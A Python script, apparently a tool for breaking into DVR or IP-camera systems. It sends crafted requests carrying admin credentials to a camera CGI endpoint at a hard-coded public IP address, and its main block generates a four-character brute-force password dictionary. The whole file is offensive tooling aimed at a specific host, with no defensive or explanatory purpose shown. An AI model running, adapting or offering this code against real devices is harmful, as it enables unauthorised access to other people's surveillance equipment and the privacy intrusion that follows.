import requests
import os
import argparse
import json
import platform
import time
import csv
import re
from tqdm import tqdm
import urllib3
import password_xz

head_wind10_chrom = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"zh-CN,zh;q=0.9",
"Cache-Control":"max-age=0",
"Connection":"keep-alive",
"Cookie":"dvr_camcnt=8; dvr_clientport=80; dvr_sensorcnt=4; lxc_save=admin%2C22222222",
"If-Modified-Since": "Tue, 23 Feb 2016 01:06:34 GMT",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

url = "http://61.180.173.188:60001/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22456%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1593571438026"
def url_parameter(url):
    para = {}
    for ur in url.split("&"):
        if ur == "":
            continue
        ur = ur.split("=",1)
        if len(ur) == 2:
            para[ur[0]] = ur [1]
    return para

def url_hostporturl(url):
    if url == None or url == "":
        return None
    urlpa = {"http":"","ip":"","post":"","url":"","parameter":{}}
    url = url.strip()
    urltype = url.split("?",1)
    if len(urltype) == 2:
        url = urltype[0]
        urlpa["parameter"] = url_parameter(urltype[1])
    urltype = url.split("://",1)
    if len(urltype) == 2:
        urlpa["http"] = urltype[0]
        url = urltype[1]
    urltype = url.split("/",1)
    if len(urltype) == 2:
        urlpa["url"] = urltype[1]
        url = urltype[0]
    urltype = url.split(":",1)
    if len(urltype) == 2:
        urlpa["ip"] = urltype[0]
        urlpa["post"] = urltype[1]
    else :
        urlpa["ip"] = url
    return urlpa


def url_text(url,headers = head_wind10_chrom):
    urlpa = url_hostporturl(url)
    print(urlpa)
    if urlpa["post"] != "":
        headers["Host"] = urlpa["ip"] + ":" + urlpa["post"]
    else :
        headers["Host"] = urlpa["ip"]
    print(headers)
    res = requests.get(url = url,verify=False,headers=headers,stream=True)
    print(res.text)
    print(res.status_code)

if __name__ == "__main__":
    # url_text(url)
    # for passer in dictionary_read("key.xqc",5):
        # print(passer)
    # dictionary_write("key.xqc",["0","15","16"],1)
    password_xz.dictionary_write("cs.xqc",password_xz.keydigit + password_xz.keybigle + password_xz.keysmale,4)